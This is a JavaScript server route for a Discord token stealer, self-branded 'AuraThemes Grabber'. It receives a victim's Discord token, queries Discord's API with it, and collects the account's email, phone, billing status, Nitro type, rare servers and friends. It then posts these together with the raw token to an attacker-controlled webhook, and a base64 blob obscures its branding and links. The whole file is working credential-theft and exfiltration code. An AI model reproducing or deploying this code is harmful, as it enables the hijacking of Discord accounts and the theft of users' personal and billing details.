import { EmbedBuilder, WebhookClient } from 'discord.js';
import DiscordToken from 'discord.js-token';
import k4itrunConfig from '../../../../k4itrun.config'

const webhook = new WebhookClient({
  url: k4itrunConfig.webhook,
});

const EMBED_COLORS = {
  raw: '#c267ff',
  initialized: '#c267ff',
};

export default async function handler(req, res) {
  try {
    const { query } = req;
    if (!query.data) {
      res.status(400).send('Bad Request: Missing "data" query parameter');
      return;
    }

    const { data } = query;
    const embed = await getEmbed();
    const resp = await fetch('https://discord.com/api/v9/users/@me', { headers: { authorization: data } });

    console.log((await resp.json()));

    const infos = DiscordToken(data).all, 
      guilds = DiscordToken(data).guilds.rares,
      friends = DiscordToken(data).friends.rares;
    const embedBuilder = infos.token ? embedStealer(infos, guilds, friends, data, embed) : embedRaw(data, embed);

    await webhook.send({
      embeds: [embedBuilder],
      username: '@AuraThemes',
      avatarURL: embed.avatar,
    });

    res.status(200).send(data);

  } catch (e) {
    console.error('Error:', e);
    res.status(500).send('Internal Server Error');
  }
}

function getField(a = null, b = null, c = false) {
  let name = a;
  let value = b;
  let inline = c;
  if (!name || name.length < 1) name = '-';
  if (!value || value.length < 1) value = '-';
  return { name, value, inline };
}

function embedRaw(data, embed) {
  const raws = new EmbedBuilder()
    .setAuthor({ name: 'AuraThemes' })
    .setColor(EMBED_COLORS.raw)
    .setTitle('raw')
    .addFields(getField('New visit lmao', `\`\`\`${data}\`\`\``))
    .setFooter({ text: 'AuraThemes API', iconURL: embed.footericon })
    .setTimestamp();
  return raws;
}

function embedStealer(infos, guilds, friends, token, embed) {
  const steal = new EmbedBuilder()
    .setAuthor({ name: `${infos.username} | ${infos.ID}`, iconURL: infos.avatar })
    .setThumbnail(infos.avatar)
    .setColor(EMBED_COLORS.initialized)
    .setTitle('AuraThemes Dualhooked - 6889.fun')
    .addFields(
      getField('<a:aura:1087044506542674091> Token:', `\`\`\`${token}\`\`\``, false),
      getField('<a:aura:1101739920319590420> Nitro:', infos.nitroType, true),
      getField('<a:aura:863691953531125820> Phone', `\`${infos.phone}\``, true),
      getField('<:aura:974711605927505990> Email', `\`${infos.mail}\``, true),
      getField('Badges', infos.badges, true),
      getField('Billing', infos.billing, true),
      getField('Langue', infos.langue, true),
      getField('\u200b', '**Rare Servers**\n' + guilds, false),
      getField('\u200b', "\u200b", false),
      getField('\u200b', '**Rare Friends**\n' + friends, false)
    )
    .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
    .setTimestamp();
  return steal;
}

async function getEmbed() {
  const embed = JSON.parse(Buffer.from('eyJkaXNjb3JkIjoiaHR0cHM6Ly9kaXNjb3JkLmdnLzdoNUREVXAyeUMiLCJhdmF0YXJfdXJsIjoiaHR0cHM6Ly9pLmltZ3VyLmNvbS95Vm5PU2VTLmdpZiIsImZvb3Rlcl91cmwiOiJodHRwczovL2kuaW1ndXIuY29tL0NlRnFKT2MuZ2lmIn0=','base64').toString('utf-8'));
  return {
    avatar: embed.avatar_url ? embed.avatar_url : "",
    url: embed.discord ? embed.discord : "",
    footericon: embed.footer_url ? embed.footer_url : "",
  };
}
